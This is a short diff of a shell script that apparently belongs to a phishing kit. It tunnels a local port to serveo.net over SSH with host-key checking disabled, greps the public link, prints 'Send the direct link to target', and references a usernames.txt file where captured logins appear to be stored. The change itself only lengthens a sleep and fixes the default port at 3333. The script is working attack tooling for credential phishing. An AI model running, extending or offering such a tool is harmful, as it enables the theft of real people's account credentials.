@@ -329,7 +329,7 @@ rm -rf sendlink
 fi
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
-sleep 4 # &
+sleep 6 # &
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
@@ -351,7 +351,7 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-default_port=$(seq 1111 4444 | sort -R | head -n1)
+default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
 printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
